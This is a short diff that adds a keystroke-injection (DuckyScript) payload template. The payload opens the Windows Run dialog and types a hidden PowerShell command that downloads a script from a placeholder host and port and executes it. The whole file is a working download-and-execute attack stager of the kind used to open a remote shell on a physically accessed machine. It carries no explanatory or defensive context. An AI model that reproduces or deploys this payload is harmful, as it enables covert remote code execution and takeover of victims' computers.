@@ -1,0 +1,5 @@
+GUI r
+ENTER
+DELAY 300
+STRING cmd /c powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://{address}:{port}/r');"
+ENTER
